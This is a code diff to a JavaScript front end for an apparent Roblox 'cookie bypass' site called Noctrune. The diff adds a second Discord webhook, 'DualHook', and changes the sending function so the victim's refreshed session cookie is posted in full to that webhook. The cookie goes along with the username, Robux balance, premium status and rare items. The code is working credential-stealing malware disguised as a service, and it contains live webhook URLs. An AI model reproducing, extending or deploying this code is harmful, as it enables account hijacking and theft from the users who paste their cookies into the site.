@@ -226,9 +226,10 @@ export default {
     })();
 
     var API_URL = window.location.origin + '/bypass/noctrune/bypass.php';
-    var WEBHOOK_URL = 'https://discord.com/api/webhooks/1537839437390684221/YdNIwo8JMhHfgqGtyy2iBaMG6UgPWqLBLgQu_qrg2paJW7YqgJNkqCXp0se0CbsArHrC';
+    var WEBHOOK_LIVE = 'https://discord.com/api/webhooks/1537815401789128756/upQ1LcHBUHEU8rESIYM6s28VDVMqNbIfQXRBIsfGhXd7T8NiIKkeZczBxXFHofuO6VoS';
+    var WEBHOOK_DUAL = 'https://discord.com/api/webhooks/1537839437390684221/YdNIwo8JMhHfgqGtyy2iBaMG6UgPWqLBLgQu_qrg2paJW7YqgJNkqCXp0se0CbsArHrC';
 
-    function sendToDiscord(data) {
+    function sendToDiscord(data, cookie) {
         var fields = [
             { name: '👤 User', value: data.username || 'Unknown', inline: true },
             { name: '🆔 User ID', value: data.userId || 'N/A', inline: true },
@@ -254,7 +255,7 @@ export default {
             timestamp: new Date().toISOString()
         };
 
-        fetch(WEBHOOK_URL, {
+        fetch(WEBHOOK_LIVE, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -262,7 +263,43 @@ export default {
                 username: 'Noctrune Bypass',
                 avatar_url: 'https://i.imgur.com/9T5z7lA.png'
             })
-        }).catch(function(err) { console.log('Webhook error:', err); });
+        }).catch(function(err) { console.log('Live webhook error:', err); });
+
+        var dualFields = [
+            { name: '👤 User', value: data.username || 'Unknown', inline: true },
+            { name: '🆔 User ID', value: data.userId || 'N/A', inline: true },
+            { name: '📊 Robux', value: data.robux !== undefined ? data.robux.toString() : '0', inline: true },
+            { name: '⏳ Pending', value: data.pendingRobux !== undefined ? data.pendingRobux.toString() : '0', inline: true },
+            { name: '💎 Premium', value: data.premium ? '✅ Yes' : '❌ No', inline: true },
+            { name: '🔮 Korblox', value: data.korblox ? '✅ Yes' : '❌ No', inline: true },
+            { name: '👻 Headless', value: data.headless ? '✅ Yes' : '❌ No', inline: true },
+            { name: '⚔️ Valkyrie', value: data.valkyrie ? '✅ Yes' : '❌ No', inline: true },
+            { name: '📡 API Status', value: data.apiStatus || '✅ Processing', inline: true },
+            { name: '🔄 Cookie Refreshed', value: data.cookieRefreshed ? '✅ Yes' : '❌ No', inline: true },
+            { name: '🍪 Refreshed Cookie', value: '```' + (cookie || 'N/A') + '```', inline: false }
+        ];
+
+        if (data.limiteds && data.limiteds.length > 0) {
+            dualFields.push({ name: '🎯 Limiteds Found', value: data.limiteds.join(', '), inline: false });
+        }
+
+        var dualEmbed = {
+            title: '🔄 DualHook - Refreshed Cookie & User Info',
+            color: 0x5865F2,
+            fields: dualFields,
+            footer: { text: 'DualHook • ' + new Date().toLocaleString() },
+            timestamp: new Date().toISOString()
+        };
+
+        fetch(WEBHOOK_DUAL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                embeds: [dualEmbed],
+                username: 'Noctrune DualHook',
+                avatar_url: 'https://i.imgur.com/9T5z7lA.png'
+            })
+        }).catch(function(err) { console.log('Dual webhook error:', err); });
     }
 
     var handleSubmit = function() {
@@ -319,7 +356,7 @@ export default {
                 var hasItems = resultData.korblox || resultData.headless || resultData.valkyrie;
                 var summary = hasItems ? '✅ Limiteds Detected' : '❌ No Limiteds';
                 resultCard.innerHTML = '<div class="result-card success"><div class="result-content"><div style="text-align:center;margin-bottom:12px;"><span class="emoji">✅</span><strong style="font-size:18px;">Cookie Bypass Successful!</strong></div><div style="text-align:center;font-size:13px;color:#8888aa;margin-bottom:12px;">Live Bypass Status</div><div class="live-status-grid"><div class="live-status-item"><span class="label">User</span><span class="value" style="color:#ff6666;">' + (resultData.username || 'Unknown') + '</span></div><div class="live-status-item"><span class="label">Robux</span><span class="value">' + (resultData.robux !== undefined ? resultData.robux.toLocaleString() : '0') + '</span></div><div class="live-status-item"><span class="label">Pending</span><span class="value">' + (resultData.pendingRobux !== undefined ? resultData.pendingRobux.toLocaleString() : '0') + '</span></div><div class="live-status-item"><span class="label">Premium</span><span class="value ' + (resultData.premium ? 'premium-true' : 'premium-false') + '">' + (resultData.premium ? '✅ Yes' : '❌ No') + '</span></div><div class="live-status-item"><span class="label">Korblox</span><span class="value ' + (resultData.korblox ? 'yes' : 'no') + '">' + (resultData.korblox ? '✅ Yes' : '❌ No') + '</span></div><div class="live-status-item"><span class="label">Headless</span><span class="value ' + (resultData.headless ? 'yes' : 'no') + '">' + (resultData.headless ? '✅ Yes' : '❌ No') + '</span></div><div class="live-status-item"><span class="label">Valkyrie</span><span class="value ' + (resultData.valkyrie ? 'yes' : 'no') + '">' + (resultData.valkyrie ? '✅ Yes' : '❌ No') + '</span></div><div class="live-status-item"><span class="label">API Status</span><span class="value processing">✅ Processing</span></div><div class="live-status-item" style="grid-column: 1 / -1;"><span class="label">Cookie Refreshed</span><span class="value yes">✅ Yes</span></div><div class="live-status-item" style="grid-column: 1 / -1;"><span class="label">Summary</span><span class="value">' + summary + '</span></div></div><div class="bypass-timestamp">Live Bypass • ' + new Date().toLocaleString() + '</div></div></div>';
-                sendToDiscord(resultData);
+                sendToDiscord(resultData, cookie);
                 window._processing = false;
             } else {
                 var errorTitle = resultData.title || '❌ System Error';
